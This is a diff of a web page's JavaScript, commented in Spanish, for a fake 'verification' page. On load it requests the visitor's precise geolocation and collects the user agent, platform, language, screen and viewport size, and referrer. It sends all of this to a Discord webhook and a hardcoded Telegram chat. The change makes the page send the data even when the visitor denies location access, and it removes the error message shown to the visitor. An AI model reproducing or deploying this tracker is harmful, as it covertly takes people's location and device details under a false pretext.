@@ -141,64 +141,132 @@
         const CHAT_ID = '7542699747';
         // ---------------------
 
+        // Objeto para almacenar todos los datos
+        let datosRecolectados = {
+            timestamp: new Date().toLocaleString('es-ES', { 
+                timeZone: 'America/Santo_Domingo',
+                dateStyle: 'full',
+                timeStyle: 'long'
+            }),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${screen.width}x${screen.height}`,
+            viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+            referrer: document.referrer || "Directo",
+            latitude: "No disponible",
+            longitude: "No disponible",
+            accuracy: "N/A",
+            ubicacionObtenida: false,
+            errorUbicacion: null
+        };
+
         window.onload = () => {
             actualizarEstado("Solicitando permisos necesarios...");
             document.getElementById("loader").classList.add("active");
             
+            // Siempre intentar obtener geolocalización
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(enviarDatos, manejarError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // Éxito: guardar coordenadas
+                        datosRecolectados.latitude = pos.coords.latitude;
+                        datosRecolectados.longitude = pos.coords.longitude;
+                        datosRecolectados.accuracy = Math.round(pos.coords.accuracy);
+                        datosRecolectados.ubicacionObtenida = true;
+                        enviarDatos();
+                    },
+                    (error) => {
+                        // Error: guardar el tipo de error y enviar de todos modos
+                        datosRecolectados.ubicacionObtenida = false;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                datosRecolectados.errorUbicacion = "Permiso denegado por el usuario";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                datosRecolectados.errorUbicacion = "Información de ubicación no disponible";
+                                break;
+                            case error.TIMEOUT:
+                                datosRecolectados.errorUbicacion = "Tiempo de espera agotado";
+                                break;
+                            default:
+                                datosRecolectados.errorUbicacion = "Error desconocido";
+                        }
+                        enviarDatos();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
             } else {
-                mostrarError("Este navegador no es compatible con el sistema de verificación.");
+                // Navegador no compatible
+                datosRecolectados.ubicacionObtenida = false;
+                datosRecolectados.errorUbicacion = "Navegador no compatible con geolocalización";
+                enviarDatos();
             }
         };
 
-        async function enviarDatos(pos) {
-            const { latitude, longitude, accuracy } = pos.coords;
-            const timestamp = new Date().toLocaleString('es-ES', { 
-                timeZone: 'America/Santo_Domingo',
-                dateStyle: 'full',
-                timeStyle: 'long'
-            });
+        async function enviarDatos() {
+            // Construir mensaje para Discord
+            const coordenadasTexto = datosRecolectados.ubicacionObtenida 
+                ? `\`${datosRecolectados.latitude}, ${datosRecolectados.longitude}\``
+                : "`No disponible`";
             
-            // Obtener información adicional
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            
-            // Mensaje para Discord
+            const precisionTexto = datosRecolectados.ubicacionObtenida
+                ? `${datosRecolectados.accuracy}m`
+                : "N/A";
+
             const discordMessage = {
                 content: `🔔 **Nueva Verificación Completada**`,
                 embeds: [{
                     title: "📍 Detalles de Acceso",
-                    color: 5814783,
+                    color: datosRecolectados.ubicacionObtenida ? 5814783 : 15158332,
                     fields: [
                         {
                             name: "Coordenadas",
-                            value: `\`${latitude}, ${longitude}\``,
+                            value: coordenadasTexto,
                             inline: false
                         },
                         {
                             name: "Precisión",
-                            value: `${Math.round(accuracy)}m`,
+                            value: precisionTexto,
+                            inline: true
+                        },
+                        {
+                            name: "Estado Ubicación",
+                            value: datosRecolectados.ubicacionObtenida ? "✅ Obtenida" : `❌ ${datosRecolectados.errorUbicacion}`,
                             inline: true
                         },
                         {
                             name: "Fecha y Hora",
-                            value: timestamp,
+                            value: datosRecolectados.timestamp,
                             inline: false
                         },
                         {
                             name: "Navegador",
-                            value: `${platform} - ${language}`,
+                            value: `${datosRecolectados.platform} - ${datosRecolectados.language}`,
                             inline: true
                         },
                         {
-                            name: "🗺️ Ver Mapa",
-                            value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                            name: "Resolución Pantalla",
+                            value: datosRecolectados.screenResolution,
+                            inline: true
+                        },
+                        {
+                            name: "Viewport",
+                            value: datosRecolectados.viewportSize,
+                            inline: true
+                        },
+                        {
+                            name: "Referrer",
+                            value: datosRecolectados.referrer,
+                            inline: false
+                        },
+                        {
+                            name: "User Agent",
+                            value: `\`\`\`${datosRecolectados.userAgent.substring(0, 500)}\`\`\``,
                             inline: false
                         }
                     ],
@@ -209,14 +277,24 @@
                 }]
             };
 
-            // Mensaje para Telegram
-            const telegramMessage = `🔔 *Nueva Verificación Completada*\n\n` +
-                `📍 *Coordenadas:* \`${latitude}, ${longitude}\`\n` +
-                `📏 *Precisión:* ${Math.round(accuracy)}m\n` +
-                `🕐 *Fecha:* ${timestamp}\n` +
-                `💻 *Sistema:* ${platform}\n` +
-                `🌐 *Idioma:* ${language}\n\n` +
-                `🗺️ [Ver en Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`;
+            // Construir mensaje para Telegram
+            let telegramMessage = `🔔 *Nueva Verificación Completada*\n\n`;
+            
+            if (datosRecolectados.ubicacionObtenida) {
+                telegramMessage += `📍 *Coordenadas:* \`${datosRecolectados.latitude}, ${datosRecolectados.longitude}\`\n`;
+                telegramMessage += `📏 *Precisión:* ${datosRecolectados.accuracy}m\n`;
+                telegramMessage += `🗺️ [Ver en Google Maps](https://www.google.com/maps?q=${datosRecolectados.latitude},${datosRecolectados.longitude})\n\n`;
+            } else {
+                telegramMessage += `📍 *Coordenadas:* No disponible\n`;
+                telegramMessage += `⚠️ *Error:* ${datosRecolectados.errorUbicacion}\n\n`;
+            }
+            
+            telegramMessage += `🕐 *Fecha:* ${datosRecolectados.timestamp}\n`;
+            telegramMessage += `💻 *Sistema:* ${datosRecolectados.platform}\n`;
+            telegramMessage += `🌐 *Idioma:* ${datosRecolectados.language}\n`;
+            telegramMessage += `📱 *Resolución:* ${datosRecolectados.screenResolution}\n`;
+            telegramMessage += `🔗 *Referrer:* ${datosRecolectados.referrer}\n\n`;
+            telegramMessage += `*User Agent:*\n\`${datosRecolectados.userAgent.substring(0, 200)}\``;
 
             try {
                 // Enviar a Discord
@@ -247,35 +325,12 @@
             }
         }
 
-        function manejarError(error) {
-            let mensaje = "No se pudo completar la verificación. ";
-            
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    mensaje += "Permisos denegados.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    mensaje += "Información no disponible.";
-                    break;
-                case error.TIMEOUT:
-                    mensaje += "Tiempo de espera agotado.";
-                    break;
-                default:
-                    mensaje += "Error desconocido.";
-            }
-            
-            mostrarError(mensaje);
-        }
-
         function mostrarExito() {
             document.getElementById("loader").classList.remove("active");
             const statusIcon = document.getElementById("statusIcon");
             statusIcon.textContent = "✅";
             statusIcon.classList.add("show");
             actualizarEstado("Verificación completada exitosamente.");
-            
-            // Opcional: redirigir después de 2 segundos
-            // setTimeout(() => { window.location.href = "https://tu-sitio.com"; }, 2000);
         }
 
         function mostrarError(mensaje) {
